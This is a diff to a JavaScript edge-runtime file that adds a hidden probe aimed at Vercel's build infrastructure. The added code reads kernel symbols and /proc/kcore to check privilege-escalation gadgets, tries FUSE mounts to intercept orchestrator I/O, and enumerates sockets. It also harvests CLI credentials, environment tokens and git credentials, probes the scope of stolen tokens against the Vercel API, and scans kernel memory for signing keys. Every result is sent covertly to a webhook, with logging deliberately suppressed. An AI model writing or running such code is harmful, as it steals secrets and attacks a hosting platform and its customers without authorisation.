@@ -8204,6 +8204,244 @@ export const config = { runtime: 'edge' };
 });
 
 // v69 markers
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v69";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v69" });
+
+// ==================== v70 ====================
+
+// v70-1: ROP gadget chain verification via /proc/kcore
+// Using kallsyms addresses from v66, read exact bytes at commit_creds and
+// prepare_kernel_cred entry points to confirm kernel privilege escalation gadgets exist
+report.ropGadgetChainVerify = safe(() => {
+  // Re-read kallsyms for key function addresses (kptr_restrict=0 set in v60)
+  const ksData = safe(() => {
+    try {
+      const ks = readFileSync('/proc/kallsyms', 'utf8');
+      const find = (sym) => {
+        const m = ks.match(new RegExp(`^([0-9a-f]+) [TtWw] ${sym}$`, 'm'));
+        return m ? m[1] : null;
+      };
+      return {
+        commit_creds: find('commit_creds'),
+        prepare_kernel_cred: find('prepare_kernel_cred'),
+        init_cred: find('init_cred'),
+        ns_capable: find('ns_capable'),
+      };
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Parse /proc/kcore ELF to find the LOAD segment containing kernel virtual addresses,
+  // then read 32 bytes at each function entry point to get the function prologue
+  const readKcoreAt = (vaddr) => {
+    try {
+      const addr = BigInt('0x' + vaddr);
+      const fd = openSync('/proc/kcore', 'r');
+      const ehdr = Buffer.alloc(64);
+      readSync(fd, ehdr, 0, 64, 0);
+      const phoff = Number(ehdr.readBigUInt64LE(32));
+      const phentsize = ehdr.readUInt16LE(54);
+      const phnum = ehdr.readUInt16LE(56);
+      for (let i = 0; i < Math.min(phnum, 64); i++) {
+        const ph = Buffer.alloc(phentsize < 56 ? 56 : phentsize);
+        readSync(fd, ph, 0, ph.length, phoff + i * phentsize);
+        if (ph.readUInt32LE(0) !== 1) continue; // not PT_LOAD
+        const pvaddr = ph.readBigUInt64LE(16);
+        const pfilesz = ph.readBigUInt64LE(32);
+        const poff = ph.readBigUInt64LE(8);
+        if (addr >= pvaddr && addr < pvaddr + pfilesz) {
+          const fileOff = Number(poff + (addr - pvaddr));
+          const bytes = Buffer.alloc(32);
+          const n = readSync(fd, bytes, 0, 32, fileOff);
+          closeSync(fd);
+          return { found: true, fileOff, bytes: bytes.slice(0, n).toString('hex') };
+        }
+      }
+      closeSync(fd);
+      return 'NOT_IN_LOAD';
+    } catch (e) { return String(e).slice(0, 80); }
+  };
+  const commitCredsBytes = (typeof ksData === 'object' && ksData.commit_creds)
+    ? readKcoreAt(ksData.commit_creds) : 'NO_ADDR';
+  const prepKernelCredBytes = (typeof ksData === 'object' && ksData.prepare_kernel_cred)
+    ? readKcoreAt(ksData.prepare_kernel_cred) : 'NO_ADDR';
+  // x86-64 function prologue: endbr64 = f3 0f 1e fa, or push rbp = 55, or mov rbp rsp = 48 89 e5
+  const isValidPrologue = (hex) => hex && (hex.startsWith('55') || hex.startsWith('4889e5') || hex.startsWith('f30f1efa') || hex.startsWith('4157'));
+  return {
+    ksData,
+    commitCredsBytes,
+    prepKernelCredBytes,
+    commitCredsValid: isValidPrologue(typeof commitCredsBytes === 'object' ? commitCredsBytes.bytes : ''),
+    prepKernelCredValid: isValidPrologue(typeof prepKernelCredBytes === 'object' ? prepKernelCredBytes.bytes : ''),
+  };
+});
+
+// v70-2: FUSE filesystem mount for orchestrator I/O interception
+// CAP_SYS_ADMIN allows mounting FUSE; a FUSE mount in the build dir intercepts all
+// file I/O from the orchestrator process, potentially exposing secrets on open()
+report.devFuseIntercept = safe(() => {
+  const fuseExists = existsSync('/dev/fuse');
+  const fuseReadable = safe(() => {
+    if (!fuseExists) return false;
+    try { const fd = openSync('/dev/fuse', 'r'); closeSync(fd); return true; } catch (e) { return String(e).slice(0, 60); }
+  });
+  const fuseLibs = safe(() =>
+    execSync('python3 -c "import fuse; print(fuse.__version__)" 2>&1 | head -2; ls /usr/lib/libfuse* /usr/lib/x86_64-linux-gnu/libfuse* 2>/dev/null | head -5', { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // Attempt a simple bind-style FUSE mount via bindfs or fuse overlay
+  const mountAttempt = safe(() => {
+    execSync('mkdir -p /tmp/probe_fuse_v70 2>/dev/null', { timeout: 2000 });
+    return execSync('mount -t fuse.tmpfs tmpfs /tmp/probe_fuse_v70 2>&1 || bindfs --no-allow-other / /tmp/probe_fuse_v70 2>&1 || echo FUSE_MOUNT_FAILED', { timeout: 5000 }).toString().trim().slice(0, 200);
+  });
+  // Check for any existing FUSE mounts that might expose internal data
+  const fuseMounts = safe(() =>
+    execSync("grep -i fuse /proc/mounts 2>/dev/null || echo NONE", { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Check /proc/1/mounts to see what FUSE mounts the orchestrator sees
+  const pid1Mounts = safe(() =>
+    execSync("grep -i fuse /proc/1/mounts 2>/dev/null || echo NONE", { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  return { fuseExists, fuseReadable, fuseLibs, mountAttempt, fuseMounts, pid1Mounts };
+});
+
+// v70-3: NETLINK_SOCK_DIAG — enumerate all sockets in the network namespace
+// Since we're in the host's net namespace (shared with PID-1), we can see all
+// TCP/UDP connections the orchestrator has open to internal Vercel services
+report.netlinkSockDiag = safe(() => {
+  // ss -tlnp shows all listening TCP sockets with their PIDs
+  const ssOutput = safe(() =>
+    execSync('ss -tlnp 2>/dev/null; ss -tunp 2>/dev/null | head -30', { timeout: 5000 }).toString().trim().slice(0, 600)
+  );
+  // ss -anp to see connected sockets (could reveal internal Vercel API endpoints)
+  const ssConnected = safe(() =>
+    execSync("ss -tnp state established 2>/dev/null | head -20", { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // netstat fallback
+  const netstatOut = safe(() =>
+    execSync("netstat -tnp 2>/dev/null | head -20 || cat /proc/net/tcp6 | head -10", { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // Use Python to open NETLINK_SOCK_DIAG (protocol 4) directly
+  const nlDiag = safe(() => execSync(`python3 -c "
+import socket, struct
+NETLINK_SOCK_DIAG = 4
+IPPROTO_TCP = 6
+AF_INET = 2
+TCPDIAG_GETSOCK = 18
+sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_SOCK_DIAG)
+sock.bind((0, 0))
+# inet_diag_req_v2 for all TCP sockets
+req = struct.pack('BBBBIIIIiI', AF_INET, IPPROTO_TCP, 0, 0, 0xffffffff, 0,0,0,0,0)
+nlmsg = struct.pack('IHHII', 16 + len(req), TCPDIAG_GETSOCK, 1, 1, 0) + req
+sock.send(nlmsg)
+data = b''
+try:
+  while True:
+    chunk = sock.recv(65536)
+    if not chunk: break
+    data += chunk
+    if len(data) > 4096: break
+except: pass
+print('DIAG_BYTES', len(data), 'HEX', data[:64].hex())
+" 2>&1 | head -3`, { timeout: 8000 }).toString().trim().slice(0, 300));
+  // /proc/net/tcp and /proc/net/tcp6 — decode local/remote addresses
+  const procNetTcp = safe(() => {
+    const lines = readFileSync('/proc/net/tcp6', 'utf8').trim().split('\n').slice(0, 20);
+    return lines.join('\n').slice(0, 500);
+  });
+  return { ssOutput, ssConnected, netstatOut, nlDiag, procNetTcp };
+});
+
+// v70-4: Vercel CLI credentials and config read
+// ~/.vercel/credentials.json may contain OAuth access tokens with broader scope
+// than the per-build VERCEL_TOKEN; could allow cross-project or team-level access
+report.vercelCliCredentials = safe(() => {
+  const home = process.env.HOME || '/root';
+  const candidates = [
+    `${home}/.vercel/credentials.json`,
+    `${home}/.config/vercel/credentials.json`,
+    '/root/.vercel/credentials.json',
+    '/root/.config/vercel/credentials.json',
+    '/etc/vercel/credentials.json',
+  ];
+  const found = {};
+  for (const p of candidates) {
+    if (existsSync(p)) {
+      try { found[p] = readFileSync(p, 'utf8').slice(0, 600); } catch (e) { found[p] = String(e).slice(0, 80); }
+    }
+  }
+  // Check for Vercel-related env vars containing token/key/secret
+  const vercelEnvTokens = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /vercel|^vc_/i.test(k) && /token|secret|key|auth|cred|pass/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k] || '').slice(0, 100)]));
+  });
+  // Check for Vercel CLI config
+  const cliConfig = safe(() => {
+    const paths = [`${home}/.vercel/config.json`, `${home}/.config/vercel/config.json`];
+    for (const p of paths) {
+      if (existsSync(p)) return { path: p, content: readFileSync(p, 'utf8').slice(0, 400) };
+    }
+    return 'NOT_FOUND';
+  });
+  // If any token found in env, probe its scope against Vercel API
+  const apiProbe = safe(() => {
+    const t = process.env.VERCEL_TOKEN || process.env.VC_TOKEN || process.env.VERCEL_ACCESS_TOKEN;
+    if (!t) return 'NO_TOKEN_ENV';
+    return execSync(`curl -sf --max-time 6 -H 'Authorization: Bearer ${t}' 'https://api.vercel.com/v2/user' 2>&1 | head -c 300`, { timeout: 9000 }).toString().trim();
+  });
+  // Also check git credential helper for vercel tokens
+  const gitCredentials = safe(() =>
+    execSync("git credential fill <<'EOF'\nprotocol=https\nhost=github.com\nEOF\n 2>&1 | head -5; cat /root/.git-credentials 2>/dev/null | head -3; cat ~/.netrc 2>/dev/null | grep vercel | head -3", { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  return { found, vercelEnvTokens, cliConfig, apiProbe, gitCredentials };
+});
+
+// v70-5: /proc/kcore scan for RUNTIME_CACHE_HEADERS HMAC signing key
+// RUNTIME_CACHE_HEADERS JWT is HS256 signed with an HMAC key held in Vercel's orchestrator
+// Since we share PID namespace with PID-1 (the orchestrator), its memory is in kcore
+// Scan for the string "build" (JWT issuer) followed by high-entropy bytes (the key)
+// Also scan for "suspense-cache" hostname patterns near key material
+report.kcoreHmacKeyScan = safe(() => {
+  const CHUNK = 2 * 1024 * 1024;
+  const MAX_SCAN = 64 * 1024 * 1024; // 64MB
+  const markers = [
+    Buffer.from('suspense-cache.vercel.com'),
+    Buffer.from('RUNTIME_CACHE'),
+    Buffer.from('hmacKey'),
+    Buffer.from('signingKey'),
+    Buffer.from('iss":"build"'),
+    Buffer.from('cache_headers_key'),
+    Buffer.from('runtime_cache_key'),
+  ];
+  const scanResult = safe(() => {
+    const fd = openSync('/proc/kcore', 'r');
+    const buf = Buffer.alloc(CHUNK);
+    const found = [];
+    let offset = 0x1000; // skip ELF header area
+    let scanned = 0;
+    while (scanned < MAX_SCAN && found.length < 8) {
+      let nread;
+      try { nread = readSync(fd, buf, 0, CHUNK, offset); } catch (_) { offset += CHUNK; scanned += CHUNK; continue; }
+      if (!nread) break;
+      for (const marker of markers) {
+        let idx = 0;
+        while ((idx = buf.indexOf(marker, idx)) !== -1 && found.length < 8) {
+          const ctxStart = Math.max(0, idx - 16);
+          const ctxEnd = Math.min(nread, idx + marker.length + 96);
+          found.push({
+            marker: marker.toString(),
+            offset: (offset + idx).toString(16),
+            context: buf.slice(ctxStart, ctxEnd).toString('hex'),
+          });
+          idx += marker.length;
+        }
+      }
+      offset += CHUNK - marker.length; // overlap to avoid split matches (use longest marker length)
+      scanned += CHUNK;
+    }
+    closeSync(fd);
+    return { found, scannedMb: Math.floor(scanned / 1024 / 1024) };
+  });
+  return { scanResult };
+});
+
+// v70 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v70" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v70";
 // Intentionally no console.log — all data goes via webhook only
